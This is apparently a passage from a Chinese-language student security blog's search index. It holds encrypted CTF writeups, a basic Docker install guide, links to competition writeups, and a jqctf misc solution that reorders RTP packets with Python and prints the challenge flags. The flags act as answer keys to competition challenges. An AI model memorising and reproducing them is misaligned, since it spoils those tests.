0b23a6122c980113810d3aea6baf77438e8d7695000f50ba4276d01d556382fb316cdadc3d4ebe613f15f24ae2bed75b60d5d08ad933020c675fb76ceab97ded7d6c5e66fb0c12f70302445ebbfc7de06e7c19608b4df0b37834cbe061f627a46621661c5d538e5ba9d78eed85734c780214c8c126ab1644c1533a1fa1f430b0daccbaa2f73030663a74f5a8ee341fc37da674ff23ae643c2ee06f48ac32363efb08a5f5773928e30fdfc1f5ee02d582640b703c0dfa74b2606adbe3c2f58f4ef8266103420beeddeec034f6fb287d08f8efbe3a80048e2b8d893cd044bbfc15b8af100a9e8719f22ae7e44de0622efaaaf90b87b14cf363bacba064f3b1660a2c7eac20b1b4ff58071619f1017517fe4e03eda25672059e71a7ac5fa5339cc9bfd66424bfe9aa219775d5192032892571c7c92a2d53dc7ab7765814f79ed03059ae9233337ed1ee6cd9ffaf1c62572099fcdb28740241e48dd5773e54a3e8478f4e855d0b720f1f644cdcc472060a60259405f72acfbc756ba6576328655f10cf8aa8e76998b5256eac738636f6417f6d7c4da9af764c8762a7b14e36832a0552971a579244e4b73887429bf7cd75c97791ed33e03f159b0c0360d78c5577f803fc85dcb500fd74291d0fb859b10f11b4a145c2da61b59ea0308151743c104dc91782c2b574e5286fc946aa993e00fd6f20fea59619b8afc71e4fe95e0c4111bbab8dcaf5a8debde0081448a69c013216a1d1109ff30fcf83abec1b6821d932ec7c7ee343d5f1cfbc2e01538456b02a03dae0605e5425ec63545bb2af9168e860176131408c3f7ef24efe45239ae7efad3d13c49faffd89683edceb344cdf68991d7436d20421fe6fee3fb9ab0428d76ce45073fab80ab1cba77d4d4128332383d513dfb833cbc8d6abcd73480530d05da77d25e1be83c25711d1d3c0c7ce644cfdfd19a8dccfd372ef8776d51b4ef64fb173d1d35f709898cb90366e38c9dde9570cdd76675d4b5c8f86bec9030f7fc3ac86d6a0718668adea0bd381de3debda86de21456cceddda6f99f210362778021c787d6763c886a812b9bccd90526fd6adbbaba33f8b61fcab0bf066b0d6c83007a94c1d8e4a802f567970012b39a189f49c28321f8d545109778381e53737843338495e5f45c9d95db77ad8027d5188ecbd7c5083aacef1d594eb018314e2eea854e2f3b1b28ec347981a55f77f02414c3db7289fd980db3231ba64aa9de9b92267414e3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟 2024 Misc 招新题 第二题（需要密码）</title>
      <link href="/2024/07/23/%E6%98%9F%E7%9B%9F-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98/"/>
      <url>/2024/07/23/%E6%98%9F%E7%9B%9F-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-%E7%AC%AC%E4%BA%8C%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a967121ba5edb66ea27903c4cb538c399392062301813ad9ad3ff2535e27f3db">825b23be34d6e48a379c92804d8d79135d53975bf2365f2e035c8e7905b28225b86ad5516eec10ca54341c6ac523e5949566dd216f630712cd1204115aa0c78e9c3d6f3569a459cf91a9a12d76324433a497bfc882f786747f0fb94af5dfbe8d475f436ae62fd2f6f0c660ef411a891412f4991355f32dd7ccf07dc0cb1a3cf5a5d646b16beea96d015a10a499a14064c5f66763091784d6e8335575e2d7e621bdd858289884f274b0e06229a5431f297a8a8400cc686fb05637677a943f3ce51ebf67336e5b9df5a380d5fb72846425a350a38013bc200c7e4a24b60ba696e218aabbd975c1d4e438be58df9c6b63226c12c9bac5f4f4a7f1a974ae1adb7bf0d5751e6bba63e507126927ffc042f533af1c927470901efc039e7307d8095b2956e56e938d322f78a13bbff05390f782462ae9b6735c05b892578502e54ffab8d6b4d734ec5702e2e7a3eba013d340bb2d8b26ea6f08f5fac97f135f50ab4611f53c1a550fea2df3139dcd0ee66f1e8e6eadc5eaab00facaa38dad115f05598bce090f8bbf218a8e81146d89f289a3367d371c5e48ba0e73c42364dba9beb787bddbdd38a8ed7304b8d978c1de99b2bd6082b7e0e6d47b51587add0299d1709c36031f4e33f0ed46310259e64b0afe70609e6730ff42945f42fc34a6caf99892459915028c59f2d9ab5c100a456036b3324b6cc8349bb47ac60ce83c2f05f282193ea95c5638f9932b3dc46a37a89c9edb9705e104ac1850fd105c4699240ca0849dfd9f885efb07e5c3aca0871da920bedc297247c8ae398e63c62f82ed4d2a0cba8b654c3b773d491d15100f8d23b50d364f6ea27a186207d5c49b268fb36431c1de7cf5d9706e03b39941d6e1d32ff5236b92ec4aaeb5e138ba6f6ce7efa6f4d7aaa42d6475131ffb6d6dcb0341720055b3894b21e7832e60fd78dbbdfbfd9a3bdf53934b7c7e4d1354b9a3d284045ab6da12f4ca291b76739314a0eee25b61673bfce5853d45ed54296eb75be500844a07b67027d775cd1f0c001a3a682180350da02a891827ddbeea6f49d9576b65d4882826360dfbc26a7c67918c5b9e485fd8d390c9b066cc7e8d0756637ff228e993af94988f5a8334c674cf3672af7f0ef460fe19f23803be864ccb65d349f19f440dd57c567f32a890eaf1c06662e15a48a2a298be814efa6e5ddf37ac17418385121861c7ee55a19f4d99367170f98adef3d95f4b3abaeae740a1ce1bb9ff79ee42d8bac0eb3016fcbd990515776df7f09553bf034b51564024d24bef2a5eaabfa4026188c397006d37f4e9f0d4280d8661e9fee2b7284b626a5f4e7ad6be9f8a23cc601999e43d8b194215b1b874d81c327db8616ae8c081e049a9d6aa3d640362ad369313fe34d6ee2d4e8ed935b7addf55e1fbffb6e398c742c2e0924b64b3230e360f6f305156f855b192fdfddd464e6ae409204534ac1dcab306e593211650ed25fea0cabaae73a505a863759420f6467d8f9c77bf05995eb12975348f5609ab0deda53f8f61fc069d4e8710139a0ae5733cf7e29fe5eaa7bd01417ccf04224cb8761784f245e7e25c4ec08e338b2011420d9d78442c9d0c118cea636c783a7cac7b9d4c17e76ff6b9567c08f710d7809af694d6ce7f20e028c19f45b438504dd165cc10243b5b77a383392fa2204c3c068cb7a515ed5e115e449d7eeeed68bf0f9d8bffb41b946aec63ecc32be18f072042dcc6d766c403a39b4f0b04acb3c6a9ea5286664f4e4e87254e7d957c9effc00ef00675dea714f8e9cdc9b5e7389aaf561465cc18a3e0d368d13cfd942f83a6bb86d1b21fe9942ff66737139098d70776b1d0a7c1a4a27888ae3b1f44d2f694c7a15fc2218d9a1aa8ef4daa71b484c71c363d0d3ab9e271c039017f54d064e3f49f2fe05f2300c65ceb957d3506cb06de262e2a0de7d3c65c6ba70b58ef40d0a0d3cec31862605ef0475e4eea293f02accc4571f36fa1b4b68514ab59541fa9377ced0ed50db78ff90c1a9d3d992e7e6029122821f3d67a109885d144cee3c7fbdb2f959dc2b8e4d597c32a0c9609adbe5aba3bbe3c69cca73d414368bc6000b665cdc3a85c9314015e77bc88d3b7559a5b27f25a8cd67a9472fef5295f85309e994f0008e9ccf4a13d20b53f7a7949af44b589aaa91c44c07bff4b27e93398b274c9e50cc102f758aede95f5c5ba06eaa5b28e46afc51a9b050217b70b01599db8e8847d33c45be68dab632eb494fad5181117ff36e871f2f05b6230302346a525a715cde2c47977b61bd5bf8b1f6ebb92e863b962f0717a46653cd8d681c6a6a98d3f644778bb03513bef1e5e6520e14f0c7053cda9cebf5660b8d3ca05821898cc24cb873c75e32ab6ea76af38e404d00f04dba5a3cf0bf7d08a43b328017cb315f8369952a03c51b148e12600748a0f9b8f64af7046f517bc8f48adaec880c4b0b8e631167ba8e80ea7c6f25960df066830bb6c56a3a5a8f7d10e365c0698b87b705facbd577a3dbd92218abb2f22b3a9a264c53b0df382715113034a996dac330f3df0e46b576c131256a21c49c4da01970698538bb1073ea5f34dc6df07c812c9938fc1b75f4a122219d1fafc23d222a54231526490bc7ed505c85e0d91138cd657cf4d72ae768763ecfa2d1ee93ba3ee4d28a527541e328ec9cdf6e0fce9c6f7ecef591a645292e96555dd97518f5c24178491934a63543346d93e1b79e1a28da6bfe15553ff0136cd9bb2b62ed30c10e503c5d294407596d5fcf1706f6d0b18c39a1425c35d18e348ec8905793169f7433cd7603844bcee018bca219d632900bc87d954f4013e32155dff0de8fc4643f05516b81084</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装使用记录（极简版）</title>
      <link href="/2024/07/20/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/20/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用到哪里写到哪里吧，随着使用的深入以后还会更新这篇文章</p></blockquote><p>参考文章传送门：</p><p><a href="https://blog.csdn.net/u012563853/article/details/125295985?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172148665016800188528574%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172148665016800188528574&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125295985-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%20docker&spm=1018.2226.3001.4187">文章一</a>，<a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172136879616800211563088%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172136879616800211563088&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=docker&spm=1018.2226.3001.4187">文章二</a>，<a href="https://blog.csdn.net/jsnhux/article/details/89847109">文章三</a>，<a href="https://www.runoob.com/docker/docker-dockerfile.html">文章四</a></p><h2 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h2><h3 id="docker介绍"><a href="#docker介绍" class="headerlink" title="docker介绍"></a>docker介绍</h3><p>Docker是一个可以用来装web应用的容器。Docker这个词的本义是码头工人，主要工作就是搬运那些“集装箱”，将它们搬运到相应的目的地去。Docker拥有着一个“超级码头”，或者说一个巨大的物流中心，我们可以把我们的“集装箱”push到这个超级码头去，以便我们在另一个码头时可以将它直接pull过来，而不是就地复刻一个曾经我们拥有过的集装箱。</p><p>有些文章中会拿docker和虚拟机作对比，深入而又透彻，什么使用了LXC技术，不需要HyperV转换之类的，这里我就不再赘述了，总结来说就是docker容器更为轻量，运行起来更为快速。</p><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>镜像，英文image，也就是上面我们提到的”集装箱“，我们的那个”超级码头“也就是镜像源。镜像的联合文件系统我也不再在这里赘述，感兴趣可以自行跳入上面的传送门去了解。</p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>容器，英文名container，可以理解为镜像的实例化。镜像是不可编辑的，容器是可以编辑的。我们可以用一个镜像生成多个容器。容器与容器之间互不干扰。</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>说明：笔者电脑系统为Ubuntu 24.04 LTS，下面的操作都在root权限下进行</p><h3 id="卸载旧版"><a href="#卸载旧版" class="headerlink" title="卸载旧版"></a>卸载旧版</h3><p>如果以前安装过，那么先卸载一下旧版docker，没有则无需卸载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="写入软件源"><a href="#写入软件源" class="headerlink" title="写入软件源"></a>写入软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><h3 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="安装一些工具"><a href="#安装一些工具" class="headerlink" title="安装一些工具"></a>安装一些工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>重启一下docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h3 id="配置阿里云镜像加速器"><a href="#配置阿里云镜像加速器" class="headerlink" title="配置阿里云镜像加速器"></a>配置阿里云镜像加速器</h3><p>登录你的阿里云账号，<a href="https://dev.aliyun.com/">传送门</a></p><p>点左上角三条杠–容器–容器镜像服务ACR–镜像工具–镜像加速器</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240720234631745.png" alt="image-20240720234631745"></p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2024-07-20-234712.png" alt="屏幕截图 2024-07-20 234712"></p><p>网站上已经详细地说明了操作步骤，这里我还是将它一步一步分开说一下</p><p>&#x2F;etc&#x2F;docker应该是已经存在了，如果没有的话就用下面的命令去创建一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br></pre></td></tr></table></figure><p>在&#x2F;etc&#x2F;docker路径下创建一个叫daemon.json的文件，编辑其内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://这里填上面给的地址.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重新加载一下daemon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="测试安装是否成功"><a href="#测试安装是否成功" class="headerlink" title="测试安装是否成功"></a>测试安装是否成功</h3><p>我们先拉取一个hello-world的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull hello-world</span><br></pre></td></tr></table></figure><p>运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果出现以下界面，则说明安装成功</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-00-11-44.png" alt="截图 2024-07-21 00-11-44"></p><h2 id="Docker简单命令"><a href="#Docker简单命令" class="headerlink" title="Docker简单命令"></a>Docker简单命令</h2><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure><p>删除本地镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像名</span><br></pre></td></tr></table></figure><p>查看本地拥有的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>用某一镜像开启一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像名</span><br></pre></td></tr></table></figure><p>开启容器时在后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure><p>查看当前运行中的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>查看存在的容器（包括不在运行中的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>停止运行某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID（可通过上面的ps命令看到，可仅写ID的前几位）</span><br></pre></td></tr></table></figure><p>删除某一容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br></pre></td></tr></table></figure><p>进入某一容器，以bash界面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器ID bash</span><br></pre></td></tr></table></figure><p>想退出容器，则输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h2><p>说明：下文中客户端ip：192.168.3.18，服务端ip：192.168.3.25</p><p>这里简述一下如何在docker中跑一个对外的web服务，用nginx镜像举例</p><p>首先pull一下nginx的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-08-49.png" alt="截图-2024-07-21-14-08-49"></p><p>如果我们想让服务跑在服务端主机的11451端口，容器内跑在80端口，那么得用如下命令，在启动容器时做一个端口映射。<strong>注意记得开启服务端主机的11451端口。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 11451:80 nginx</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-16-37.png" alt="截图-2024-07-21-14-16-37"></p><p>这里我们可以看一下这个容器的ID和运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/%E6%88%AA%E5%9B%BE-2024-07-21-14-18-55.png" alt="截图-2024-07-21-14-18-55"></p><p>可以看到已经成功运行了。</p><p>此时我们就可以用客户端浏览器去访问服务端的11451端口了，如果看到如下页面，那么就说明成功了。</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240721142135086.png" alt="image-20240721142135086"></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。通过定义一系列命令和参数，Dockerfile 指导 Docker 构建一个自定义的镜像。</p><p>dockerfile中的指令及其作用：</p><p><img src="/images/docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20240809205825697.png" alt="image-20240809205825697"></p><p>要通过dockerfile构建镜像，首先切到dockerfile所在的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 自定义镜像名 .</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024 Writeup</title>
      <link href="/2024/06/01/LitCTF2024-Writeup/"/>
      <url>/2024/06/01/LitCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/LitCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> LitCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jqctf2024初赛 Misc</title>
      <link href="/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/"/>
      <url>/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一次X1cT34m前辈们的狂欢（竟然直接给干到第一了！！？），我只是做个misc给前辈们助助兴。。。</p></blockquote><h3 id="flag-video-version"><a href="#flag-video-version" class="headerlink" title="flag_video_version"></a>flag_video_version</h3><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202344.png)</p><p>从sdp.txt中得知视频通过RTP传输，编码方式为H264</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202557.png)</p><p>wireshark中Decode As RTP</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 202921.png)</p><p>从RTP流分析中可以看出序列存在问题，将每一个分组对应的序列保存进2.txt</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 203245.png)</p><p>追踪UDP流，将传输的内容保存进1.txt</p><img src="/images/jqctf2024初赛-Misc/屏幕截图 2024-05-26 203444.png" alt="屏幕截图 2024-05-26 203444" style="zoom:50%;" /><p>写脚本将这些数据包按照正常的顺序拼接起来，最终保存为data.264</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">num=[]</span><br><span class="line">ls=[]</span><br><span class="line">a=f2.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(a):</span><br><span class="line">    num.append(<span class="built_in">int</span>(a))</span><br><span class="line">    a=f2.readline().strip()</span><br><span class="line">b=f1.readline().strip()</span><br><span class="line"><span class="keyword">while</span>(b):</span><br><span class="line">    ls.append(b)</span><br><span class="line">    b=f1.readline().strip()</span><br><span class="line">sorted_ls = [x <span class="keyword">for</span> _, x <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">zip</span>(num, ls))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted_ls:</span><br><span class="line">    f3.write(i)</span><br><span class="line">    f3.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/jqctf2024%E5%88%9D%E8%B5%9B-Misc/image-20240526203853688.png"></p><p>用MilkPlayer播放这个视频，视频展示了flag</p><p>![](&#x2F;images&#x2F;jqctf2024初赛-Misc&#x2F;屏幕截图 2024-05-26 204143.png)</p><p>flag{ef051f0cd551650c8b6c9eac7b5ad861}</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>flag{605379906}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> jqctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024 Writeup</title>
      <link href="/2024/05/19/CISCN2024-Writeup/"/>
      <url>/2024/05/19/CISCN2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="初赛Writeup"><a href="#初赛Writeup" class="headerlink" title="初赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/CISCN2024Writeup.pdf">初赛Writeup</a></h4><p>Additional Statement:</p><p>这是一次由四个大一新生组成的X2cT34m的奇妙冒险，</p><p>我参与做了crypto和一部分的misc</p><h4 id="华东北赛区赛Writeup"><a href="#华东北赛区赛Writeup" class="headerlink" title="华东北赛区赛Writeup"></a><a href="https://www.blog.st4rr.top/writeups/CISCN2024Writeup1.pdf">华东北赛区赛Writeup</a></h4><p>Additional Statement:</p><p>第一次打线下，AWDP模式。</p><p>太菜了，面对题目一脸懵（T0T）</p><p>但是听说是可以通过patch包传个马上去再攻击的（？？！），比赛时我们队虽然想到了但是没去试，还是打保守了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 Writeup</title>
      <link href="/2024/04/29/XYCTF2024-Writeup/"/>
      <url>/2024/04/29/XYCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://f4k3r.top/pdf_file/XYCTF2024%20%E5%88%AB%E7%AE%A1%20Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>f4k3r</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> XYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 CrazyC2</title>
      <link href="/2024/04/02/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/"/>
      <url>/2024/04/02/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-CrazyC2/</url>
      
